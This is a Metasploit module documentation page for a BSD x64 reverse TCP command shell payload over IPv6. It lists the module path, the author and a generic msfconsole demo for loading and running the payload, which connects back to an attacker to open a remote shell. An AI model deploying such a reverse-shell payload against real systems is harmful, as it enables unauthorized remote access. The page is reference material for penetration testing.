## BSD x64 Command Shell, Reverse TCP Inline (IPv6)

Connect back to attacker and spawn a command shell over IPv6


## Module Name
payload/bsd/x64/shell_reverse_ipv6_tcp

## Authors
Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>





## Platforms
bsd

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/bsd/x64/shell_reverse_ipv6_tcp
msf payload(shell_reverse_ipv6_tcp) > show targets
   ... a list of targets ...
msf payload(shell_reverse_ipv6_tcp) > set TARGET <target-id>
msf payload(shell_reverse_ipv6_tcp) > show options
   ... show and set options ...
msf payload(shell_reverse_ipv6_tcp) > run
```
    
    